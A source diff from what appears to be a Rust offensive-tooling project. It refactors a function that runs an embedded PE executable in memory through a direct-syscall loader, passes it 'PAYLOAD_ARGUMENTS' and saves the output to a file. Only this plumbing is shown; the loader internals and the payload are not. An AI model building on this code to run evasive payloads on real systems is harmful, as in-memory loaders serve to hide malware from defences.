@@ -3,7 +3,6 @@ use std::fs::File;
 use std::io::Write;
 use std::panic;
 
-use crate::common::output::OutputRedirector;
 #[allow(unused_imports)]
 use crate::debug_error;
 #[allow(unused_imports)]
@@ -25,7 +24,6 @@ use crate::debug_info_msg;
 
 use crate::winapi::nt::syscall_wrapper::SyscallWrapper;
 use crate::winapi::pe_loader::PE_Loader;
-use crate::winapi::pe_loader::PE_Options;
 
 
 #[allow(dead_code)]
@@ -34,11 +32,13 @@ pub fn do_load()
     let result: Result<(), Box<dyn Any + Send>> = panic::catch_unwind(|| {
         let pe_bytes = get_pe();
         debug_success_msg!(format!("PE loaded, size = {}", pe_bytes.len()));
-        let options = PE_Options {
-            patch_exit_functions: true,
-            collect_output: true,
-        };
-        load(pe_bytes, options);
+        let args = String::from(env!("PAYLOAD_ARGUMENTS"));
+        if args.is_empty() {
+            load_exe(pe_bytes, None);
+        }
+        else {
+            load_exe(pe_bytes, Some(args));
+        }
     });
     match result {
         Err(_) => debug_error_msg!(format!("An Error occured")),
@@ -59,14 +59,13 @@ fn get_pe() -> Vec<u8> {
     pe_bytes.to_vec()
 }
  
-fn load(pe_bytes: Vec<u8>, options: PE_Options) {
-    let args = String::from(env!("PAYLOAD_ARGUMENTS"));
+fn load_exe(pe_bytes: Vec<u8>, args: Option<String>) {
+    
     let ntdll = SyscallWrapper::new();
-    let redirector = OutputRedirector::new();
 
-    let mut pe_loader = PE_Loader::new(ntdll, redirector, options);
+    let mut pe_loader = PE_Loader::new(ntdll);
 
-    let (res, output) = pe_loader.execute_exe(pe_bytes.clone(), args);
+    let (res, output) = pe_loader.execute_exe(pe_bytes.clone(), true, true, args);
     if !res {
         debug_error_msg!("Failed to execute PE."); 
     }
@@ -74,7 +73,6 @@ fn load(pe_bytes: Vec<u8>, options: PE_Options) {
     match output {
        None => debug_info_msg!("No output"),
        Some(output) => { 
-            //debug_success_msg!(format!("PE Executed : output = \n{}", output));
             let mut file = File::create("output.txt").unwrap();
             write!(file, "{}", output).unwrap();
         }
